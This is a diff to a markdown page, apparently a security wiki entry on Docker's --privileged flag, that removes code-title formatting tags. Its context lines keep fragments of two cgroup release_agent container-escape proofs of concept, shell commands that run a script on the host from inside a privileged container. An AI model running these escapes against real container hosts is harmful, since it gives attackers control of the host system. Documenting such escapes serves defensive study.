@@ -19,7 +19,7 @@
 
 # `--privileged` flag
 
-{% code title="Initial PoC" %}
+
 ```bash
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -33,9 +33,9 @@ echo "#!/bin/sh $1 >$t/o" >/c;
 chmod +x /c;
 sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 ```
-{% endcode %}
 
-{% code title="Second PoC" %}
+
+
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -61,7 +61,7 @@ chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 head /output
 ```
-{% endcode %}
+
 
  The `--privileged` flag introduces significant security concerns, and the exploit relies on launching a docker container with it enabled. When using this flag, containers have full access to all devices and lack restrictions from seccomp, AppArmor, and Linux capabilities.
 
